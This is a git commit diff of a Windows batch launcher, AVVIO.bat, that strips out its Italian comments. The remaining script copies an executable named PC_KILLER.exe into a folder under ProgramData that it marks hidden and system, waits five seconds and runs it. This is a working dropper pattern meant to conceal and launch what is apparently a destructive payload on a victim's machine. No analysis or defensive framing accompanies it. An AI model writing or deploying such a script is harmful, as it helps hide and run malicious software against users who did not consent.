c9c4b8cc49d575565484da4b0fb3aec66af34026
Smask <gdambrosio339@gmail.com>
2025-08-10 12:33:13 +0200

    START.bat

--- AVVIO.bat
+++ AVVIO.bat
@@ -1,21 +1,14 @@
 @echo off
-:: Configurazione
+
 set "SOURCE_EXE=PC_KILLER.exe"
 set "TARGET_DIR=%ProgramData%\.SmaskHidden"
 set "TARGET_EXE=%TARGET_DIR%\%SOURCE_EXE%"
-
-:: Crea cartella nascosta se non esiste
 if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
     attrib +h +s "%TARGET_DIR%"
 )
-
-:: Copia il file exe nella cartella nascosta
 copy "%~dp0%SOURCE_EXE%" "%TARGET_EXE%" /Y >nul
-
-:: Aspetta 5 secondi
 timeout /t 5 /nobreak >nul
-
-:: Avvia il programma copiato
 start "" "%TARGET_EXE%"
 exit
+
